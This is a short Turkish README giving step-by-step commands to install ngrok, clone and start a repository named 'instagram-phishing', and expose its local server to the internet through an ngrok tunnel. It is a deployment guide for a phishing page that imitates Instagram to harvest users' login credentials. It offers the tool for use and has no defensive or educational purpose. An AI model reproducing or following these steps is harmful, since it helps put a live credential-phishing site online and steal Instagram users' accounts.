# Proje Adı

Bu proje yerel bir sunucu üzerinde çalışan bir web sayfasıdır. İnternet üzerinden erişilebilir hale getirmek için **ngrok** kullanılır.

## Gereksinimler
```
- Programı çalıştırmak için gerekli ortam (Python, Node.js vb. – projenize göre)
- [ngrok](https://ngrok.com) hesabı (ücretsiz)
```
## 1. ngrok Kurulumu

### Hesap Oluşturma

1. [https://ngrok.com](https://ngrok.com) adresine gidin ve ücretsiz hesap oluşturun.
2. Giriş yaptıktan sonra **Dashboard** → **Your Authtoken** bölümünden authtoken’inizi kopyalayın.

### Linux terminalde ngrok kurulumu
```
- wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
- sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
```
### Ngrok versiyon kontorlü için;

```
- ngrok version
```
### Terminalinize ngrok üzerinden aldığınız ngrok tokenini aktif edin

```
ngrok config add-authtoken TRY_TOKEN
```
### Phishing programını çalıştırma;
```
1. Açtığınız terminale bu komutları girin ve programı aktif edin

- git clone https://github.com/ghost0x02/instagram-phishing
- cd instagram phishing
- python3 instagram-phishing.py start
```
```
2. Açtığınız terminale bu kodu girin

- ngrok http 5000
```







